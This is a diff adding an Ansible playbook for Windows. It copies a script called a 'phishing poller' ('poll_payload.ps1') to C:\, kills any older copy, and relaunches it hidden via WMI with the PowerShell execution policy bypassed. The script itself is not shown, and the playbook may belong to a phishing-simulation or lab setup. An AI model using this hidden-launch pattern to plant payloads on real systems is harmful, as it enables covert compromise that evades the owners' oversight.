@@ -1,0 +1,14 @@
+---
+- name: Copy phishing poller script
+  win_copy:
+    src: poll_payload.ps1
+    dest: C:\poll_payload.ps1
+
+- name: Kill any existing poller process
+  win_shell: |
+    Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Where-Object {$_.CommandLine -like '*poll_payload*'} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+  ignore_errors: yes
+
+- name: Start poller in background
+  win_shell: |
+    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\poll_payload.ps1'}
